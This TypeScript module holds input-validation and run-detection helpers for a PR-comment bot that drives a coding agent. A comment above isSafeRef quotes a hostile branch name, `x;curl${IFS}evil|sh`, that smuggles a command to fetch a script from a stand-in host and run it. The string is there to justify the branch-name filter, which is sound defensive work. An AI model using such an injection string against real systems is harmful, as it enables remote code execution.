// Pure functions with no I/O, split out so the test suite can exercise the tricky decision logic
// (command parsing, completion detection, output stabilisation) without touching Orca or GitHub.

export type Command = { type: "stop" } | { type: "help" } | { type: "prompt"; prompt: string } | null;

// GitHub Actions forwards the raw PR comment body. A valid command is "/orca" at the very start
// of the (trimmed) comment, followed by either nothing, or whitespace + the rest of the prompt.
// "/orcaX" and "hello /orca" are not commands — the workflow filters these too, but the server
// must not trust that and re-checks here. Bare "/orca" asks for the usage text. "stop" also
// accepts the ways people actually type it ("stop.", "Stop!", "stop please", "please stop") —
// anything longer is a prompt, since "stop the dev server and rerun the tests" is real work.
export function parseCommand(body: string): Command {
  const match = /^\/orca(?:\s+([\s\S]*))?$/.exec(body.trim());
  if (!match) return null;
  const rest = (match[1] ?? "").trim();
  if (!rest) return { type: "help" };
  if (/^(?:please\s+)?stop(?:\s+please)?[\s.!]*$/i.test(rest)) return { type: "stop" };
  return { type: "prompt", prompt: rest };
}

// Posted as-is when someone comments a bare "/orca".
export const USAGE =
  "🐳 orca: how to use it\n\n" +
  "- `/orca <what you want>` — the agent works on this PR's branch and replies here. Follow-ups keep the same session.\n" +
  "- `/orca stop` — closes this PR's session once the current request finishes.\n\n" +
  "Only new comments on the PR conversation count: edits and review comments are ignored.";

// Branch names reach shell commands on the agent host (`git fetch origin <head>`), and git
// accepts names like `x;curl${IFS}evil|sh`. Allow only the characters real branches here use,
// minus the forms git itself rejects. Callers also shell-quote (see shq) — this is the gate.
export function isSafeRef(ref: string): boolean {
  return (
    /^[A-Za-z0-9._\/-]+$/.test(ref) &&
    !ref.startsWith("-") &&
    !ref.startsWith("/") &&
    !ref.endsWith("/") &&
    !ref.endsWith(".lock") &&
    !ref.includes("..") &&
    !ref.includes("//")
  );
}

// Single-quotes a value for a POSIX shell command line.
export function shq(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

export type RunOutcome = "pending" | "done" | "error";

// Whether an Orca automation run counts as finished. Both signals are needed because Orca's
// `status` field is unreliable on its own:
//   - on a FRESH session, `status` flips to "completed" ~3s after dispatch, well before the
//     agent has answered — the terminal is still just a shell prompt (not idle).
//   - on a REUSED session, `status` stays "dispatched" until the run genuinely finishes.
//   - `tui-idle` alone can be true before the prompt has even been typed into the terminal.
// `status === "completed" && idle` matched the real answer in every case we measured.
export function isDone(status: string, idle: boolean): RunOutcome {
  if (status === "failed" || status === "cancelled" || status === "error") return "error";
  if (status === "completed" && idle) return "done";
  return "pending";
}

// The stabiliser: a fresh session's first output snapshot can be a raw TUI frame that Orca later
// replaces with the clean final message, so we wait for two consecutive polls to report the same
// `capturedAt` before trusting the content. Takes the sequence of capturedAt readings seen so far
// and returns the value once it has repeated back-to-back, or undefined if it hasn't yet.
export function stable(capturedAts: ReadonlyArray<string | null>): string | undefined {
  for (let i = 1; i < capturedAts.length; i++) {
    const prev = capturedAts[i - 1];
    const curr = capturedAts[i];
    if (prev !== null && prev === curr) return curr;
  }
  return undefined;
}

// Orca's first output capture on a fresh session is the raw terminal frame from BEFORE the agent
// TUI came up: the shell prompt, sudo's banner, and the `claude '--dangerously-skip-permissions'
// '<our whole prompt>'` launch line. At that moment `status` is already "completed" and
// `tui-idle` is trivially true (there is no TUI yet), so the two-signal check passes and the frame
// got posted to a PR verbatim (PR 482). Each rule below matches that frame's shape specifically,
// because a looser match holds back real answers until the run times out (seen live: `/orca
// token` on a WO-PR hung 60 min — its marker was "token", and the answer said "token"):
//   - the launch line itself: `claude` + the flag *in shell quotes*. An answer that merely
//     mentions the flag writes it bare (`claude --dangerously-skip-permissions`).
//   - our own prompt echoed back, i.e. the capture STARTS with the marker (optionally as a
//     "> " quote). An answer that quotes our preamble somewhere in the middle is still an answer.
//   - a capture that ends on a shell prompt: `user@host:path$` or a prompt ending " $". Not any
//     trailing `$` — "ราคา 5$" is an answer.
export function isLaunchFrame(content: string, marker: string): boolean {
  const c = content.trim();
  if (c === "") return true;
  if (/claude\s+'--dangerously-skip-permissions'/.test(c)) return true;
  if (marker && c.replace(/^>\s*/, "").startsWith(marker)) return true;
  const lastLine = c.split("\n").pop()!.trim();
  return /^[\w.-]+@[\w.-]+:\S*[$#]$/.test(lastLine) || /(^|\s)\$$/.test(lastLine);
}

// Marker for a task prompt's echo: its first 40 chars — but only when there are 40. A shorter
// prompt ("ok", "token", "yes") makes a marker that ordinary answers contain.
export function launchMarker(prompt: string): string {
  const head = prompt.trim().slice(0, 40);
  return head.length === 40 ? head : "";
}

// Git branch for a Notion work order: claude/WO-<wo>-<slug>, ASCII letters/digits only, spaces
// collapsed to single dashes, capped at 40 chars of slug. A title with nothing sluggable (e.g.
// all-Thai) yields just claude/WO-<wo> — the WO number alone is still a unique, valid branch name.
export function branchFor(wo: number, title: string): string {
  const slug = title
    .toLowerCase()
    .replace(/[^a-z0-9\s]/g, "")
    .trim()
    .replace(/\s+/g, "-")
    .slice(0, 40)
    .replace(/-+$/, ""); // a 40-char cut can land mid-dash; drop the dangling one
  return slug ? `claude/WO-${wo}-${slug}` : `claude/WO-${wo}`;
}

// Loose check for the /tasks payload: n8n forwards whatever URL the Notion page gave it verbatim
// (notion.so or a custom domain), so we only need https + "notion" somewhere in the host, not a
// strict shape.
export function isNotionUrl(url: string): boolean {
  return /^https:\/\/\S*notion\S*/i.test(url);
}

// Renders a task's prompt (authored in Notion, passed through by n8n as `prompt` — see
// server.ts's POST /tasks) against the session's own values, replacing `{{branch}}`, `{{wo}}`,
// `{{title}}`, `{{notion_url}}`, `{{repo_app}}`. An unrecognised `{{...}}` is left untouched
// rather than blanked, so a typo in the Notion prompt fails loudly instead of silently vanishing
// (own keys only — `{{constructor}}` must not resolve to Object.prototype's);
// a template with no placeholders at all is returned unchanged.
export function renderPrompt(template: string, vars: Record<string, string>): string {
  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => (Object.hasOwn(vars, key) ? vars[key] : match));
}
